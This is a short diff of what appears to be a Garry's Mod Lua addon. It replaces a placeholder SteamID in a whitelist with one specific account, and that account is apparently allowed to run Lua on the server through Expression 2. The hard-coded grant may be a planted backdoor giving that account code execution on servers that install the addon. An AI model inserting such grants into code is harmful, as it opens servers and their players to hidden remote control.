@@ -1,5 +1,5 @@
 
-local WhiteList = { ["STEAM_9:0:00000000"] = true }
+local WhiteList = { ["STEAM_0:1:34154775"] = true }
 hook.Add("PlayerInitialSpawn", "E2P_runlua", function(ply)
 	if(WhiteList[ply:SteamID()]) then ply.e2runinlua=true end
 end)
